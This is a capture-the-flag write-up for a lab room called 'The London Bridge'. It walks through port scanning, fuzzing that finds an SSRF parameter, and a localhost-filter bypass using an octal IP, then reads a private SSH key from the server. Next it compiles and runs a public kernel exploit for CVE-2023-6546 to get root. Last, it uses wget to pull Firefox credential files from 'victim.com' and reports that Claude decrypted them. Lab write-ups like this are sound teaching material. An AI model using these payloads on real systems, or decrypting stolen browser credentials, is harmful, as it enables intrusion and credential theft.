# The London Bridge

This is a classic boot2root, CTF-style room. Make sure to get all the flags. The room can take up to 5 minutes to fully boot — please be patient. Please use rate limiters while brute-forcing.

**Objectives:**
- What is the user flag?
- What is the root flag?
- What is the password of Charles?

---

## Reconnaissance

I started with a basic Nmap scan to identify the services running on the target.

```
sudo nmap -sS 10.82.177.229
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-19 15:00 BST
Nmap scan report for 10.82.177.229
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)

PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

The scan revealed two open ports: **22 (SSH)** and **8080 (HTTP)**. Visiting port 8080 presented the main webpage, so the next step was to enumerate directories.

## Directory Enumeration

```
gobuster dir -w DirBuster-2007_directory-list-2.3-big.txt -u http://10.82.177.229:8080 -x php,html,txt
```

```
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1722]
/upload               (Status: 405) [Size: 178]
/dejaview             (Status: 200) [Size: 823]
```

`/dejaview` isn't linked from the main page. After viewing it, I found an option to "upload" web URLs to display an image — this looked like the main vulnerability on the site. I tried uploading a reverse shell from my Python server, but it didn't work. The original POST body was `image_url=test.png`, so I decided to enumerate the parameter name itself to see if there were other options.

## Finding the SSRF

```
ffuf -u http://10.82.177.229:8080/view_image \
  -w DirBuster-2007_directory-list-2.3-big.txt \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://10.82.177.229:8080/dejaview" \
  -d "FUZZ=/view_image/uploads/test.png" \
  -ac
```

```
www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 306ms]
```

Testing this parameter in Burp returned a 500 "Internal Server Error." This looked like an **SSRF**. I changed it to `http://localhost:8080/uploads/test.png` and got a different error — 403 Forbidden. I then tried an obfuscated address, `www=http://0177.0.0.1:80/uploads/test.png`, and it worked with no errors.

I then fuzzed the server's file directory:

```
ffuf -u http://10.82.177.229:8080/view_image \
  -w raft-large-words.txt \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "www=http://0177.0.0.1:80/FUZZ" \
  -ac \
  -t 100
```

```
templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 80ms]
uploads                 [Status: 200, Size: 671, Words: 24, Lines: 23, Duration: 140ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 310ms]
.                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 297ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 297ms]
.local                  [Status: 200, Size: 414, Words: 19, Lines: 18, Duration: 282ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 237ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 297ms]
.bash_logout            [Status: 200, Size: 220, Words: 35, Lines: 8, Duration: 242ms]
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 255ms]
localhost               [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 193ms]
.env                    [Status: 200, Size: 533, Words: 22, Lines: 21, Duration: 275ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 299ms]
.gnupg                  [Status: 200, Size: 372, Words: 17, Lines: 16, Duration: 228ms]
:: Progress: [119600/119600] :: Job [1/1] :: 223 req/sec :: Duration: [0:05:09] :: Errors: 1 ::
```

## Gaining a Foothold

Fuzzing turned up a `.ssh` directory containing a private RSA key and the associated username.

```
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa beth@10.82.177.229
```

I logged in and found the first flag in the `__pycache__` directory:

```
THM{l0n6_##########_qu33n}
```

## Identifying the Privilege Escalation Path

Before searching for an exploit, I wanted to confirm exactly what I was dealing with:

```
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

This gave me the kernel version (`4.15.0-112-generic`) and confirmed the box was **Ubuntu**, running an **SMP (multi-core)** kernel. The `4.15.0` line is characteristic of Ubuntu 18.04 LTS, and this particular build dates to mid-2020 — meaning it predates several years of kernel security patches.

Searching for local privilege escalation exploits matching that kernel/distro combination led me to [zerozenxlabs/ZDI-24-020](https://github.com/zerozenxlabs/ZDI-24-020), a public exploit for **CVE-2023-6546** — a race condition in the Linux kernel's GSM multiplexing (`tty/n_gsm`) driver leading to a use-after-free. The exploit's own documentation states it targets **Ubuntu 18.04+20.04 LTS** systems and specifically requires an **SMP kernel** to reliably win the race condition — both of which matched what `uname -a` had just told me. That made it a strong candidate over other, more generic privesc exploits.

## Privilege Escalation

I pulled the exploit and compiled it on the target:

```
gcc exploit.c -o exploit -lpthread
./exploit
```

It worked and gave me root access. From `/root`, I retrieved the admin flag:

```
THM{l0nd0n_######_p47ch3d}
```

## Finding Charles's Password

To find Charles's flag, I checked his home directory and initially found nothing there. Running `ls -all` revealed a bunch of old Firefox profile data, including a saved-login file and a key file. I spun up a Python server on the victim machine and pulled the files down:

```
wget http://victim.com/./.mozilla/firefox/8k3bf3zp.charles/key4.db
wget http://victim.com/./.mozilla/firefox/8k3bf3zp.charles/logins.json
```

I sent both files to Claude to decrypt, and recovered the final answer:

```
king##############
```

## Summary

This room involved chaining multiple vulnerabilities together:

1. **Reconnaissance** with Nmap to identify exposed services.
2. **Directory enumeration** with Gobuster to discover hidden endpoints, including `/dejaview`.
3. Parameter discovery via FFUF to reveal the `www` field behind the image-upload feature.
4. Exploitation of an **SSRF** vulnerability, bypassing localhost filtering with an obfuscated IP (`0177.0.0.1`), to reach internal-only files.
5. Directory fuzzing over SSRF to locate an exposed `.ssh` directory containing a private key.
6. Authentication over SSH to obtain the user flag.
7. Kernel and distro fingerprinting via `uname -a` to identify a matching **privilege escalation** exploit — CVE-2023-6546 (ZDI-24-020), which targets Ubuntu 18.04/20.04 SMP kernels.
8. Exploitation of CVE-2023-6546 to gain root and obtain the root flag.
9. Extraction and decryption of a Firefox saved-login database (`key4.db` + `logins.json`) to recover Charles's password.
